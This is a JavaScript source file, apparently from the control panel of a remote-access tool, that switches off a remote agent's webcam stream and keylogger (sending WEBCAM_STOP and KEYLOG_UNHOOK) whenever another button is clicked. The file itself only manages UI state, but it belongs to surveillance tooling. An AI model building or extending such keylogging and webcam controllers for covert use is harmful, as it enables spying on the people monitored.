/**
 * stateManager.js - State Management for Webcam and Keylogger
 * Centralized control for automatically turning off webcam/keylogger when other buttons are pressed
 * This maintains separation of concerns by not modifying individual command functions
 */

/**
 * Turns off webcam if it's currently on
 * This is a pure function that only manages webcam state
 */
function turnOffWebcamIfOn() {
    if (isWebcamOn || isWaitingForWebcamFrame) {
        // Turn off webcam
        isWebcamOn = false;
        isWaitingForWebcamFrame = false;
        updateWebcamButton();
        // Clear the image when stopping webcam
        const webcamImg = document.getElementById('monitor-img');
        if (webcamImg) {
            webcamImg.src = '';
        }
        sendToGateway({ command: 'WEBCAM_STOP' });
    }
}

/**
 * Turns off keylogger if it's currently on.
 * Sends the unhook command, updates UI state, and stops the auto-refresh timer.
 */
function turnOffKeylogIfOn() {
    if (!isKeyloggerActive) return;

    // Send unhook command to agent
    sendToGateway({ command: 'KEYLOG_UNHOOK' });

    // Update local state & UI
    isKeyloggerActive = false;
    updateKeylogButtons();

    // Stop auto-refresh if running
    if (keylogAutoRefreshTimer) {
        clearInterval(keylogAutoRefreshTimer);
        keylogAutoRefreshTimer = null;
    }

    logStatus("Đang tắt keylogger (tự động do chuyển chức năng)...");
}

/**
 * Initializes event delegation to automatically turn off webcam / keylogger
 * when other buttons are clicked.
 *
 * This intercepts button clicks and turns off webcam/keylogger before the
 * original handler runs.
 *
 * The webcam & keylogger buttons themselves are excluded from this behavior.
 * Handles both sidebar buttons and dynamically created buttons (e.g., kill
 * buttons in table).
 */
function initWebcamAutoOff() {
    const container = document.querySelector('.container');
    if (!container) return;
    
    // Use event delegation to catch all button clicks in the container
    // This includes sidebar buttons and dynamically created buttons in the table
    container.addEventListener('click', function(event) {
        // Find the clicked button (event might bubble from child elements)
        const button = event.target.closest('button');
        if (!button) return;
        
        // Exclude the webcam and keylogger buttons themselves
        if (
            button.id === 'btn-webcam' ||
            button.id === 'btn-keylog-start' ||
            button.id === 'btn-keylog-stop' ||
            button.id === 'btn-keylog-clear'
        ) {
            return;
        }
        
        // Turn off webcam / keylogger if they're on (before the original onclick handler executes)
        turnOffWebcamIfOn();
        turnOffKeylogIfOn();
        
        // Note: The original onclick handler will still execute normally
        // This just ensures webcam/keylogger are turned off first
    });
}

